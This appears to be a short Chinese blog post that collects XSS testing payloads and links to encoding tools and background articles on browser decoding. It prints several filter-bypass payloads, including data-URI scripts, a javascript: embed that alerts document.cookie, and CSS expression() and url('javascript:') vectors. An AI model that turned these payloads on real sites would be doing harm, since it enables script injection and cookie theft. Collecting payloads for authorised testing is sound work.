---
layout: post
title: "xss手工测试payload及在线工具"
description: ""
category: 
tags: []
---
{% include JB/setup %}

#相关文章

[浏览器是如何解码的](http://www.freebuf.com/articles/web/10121.html)
[XSS与字符编码的那些事儿](http://xss1.com/?p=19)
[网络浏览器的工作原理](http://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#Resources)


#编码工具

[Xss安全测试字符转换工具](http://app.baidu.com/app/enter?appid=280383)

[hackvertor](http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php)



#payload

	<script></script><svg><script>document.scripts[0].src&#00000000000000000000061/data:,alert(2)/.source</script>

这个好高端啊。

	<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>

	<embed allownetworking="all" allowscriptaccess="never" height="400" quality="high" src="javascript:alert(document.cookie)" style="margin:0.0px;float:none;" type="application/x-shockwave-flash" width="480">sssssssssssssssssssssssssssssssssss</embed>


	<div style="background:url('javascript:alert(1)')">

ie6测试OK

	<div style="x:expression(alert(1))">


